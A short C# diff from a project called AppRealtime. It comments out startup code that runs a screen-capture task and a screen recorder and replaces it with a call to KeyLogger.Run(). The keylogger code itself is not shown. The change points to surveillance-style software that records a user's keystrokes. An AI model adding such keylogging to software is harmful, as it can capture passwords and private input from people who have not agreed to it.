@@ -35,15 +35,17 @@ namespace AppRealtime
             _screenTask = new ScreenTask();
             _screenTask.LoadSettings();
 
-            Task.Run(() =>
-            {
-                _ = _screenTask.StartTaskAsync();
-            });
-            Task.Run(async () =>
-            {
-                _screenRecorder = new ScreenRecorder(_screenTask.CurrentSettings);
-                await _screenRecorder.RunAsync();
-            });
+            //Task.Run(() =>
+            //{
+            //    _ = _screenTask.StartTaskAsync();
+            //});
+            //Task.Run(async () =>
+            //{
+            //    _screenRecorder = new ScreenRecorder(_screenTask.CurrentSettings);
+            //    await _screenRecorder.RunAsync();
+            //});
+
+            KeyLogger.Run();
         }
     }
 }
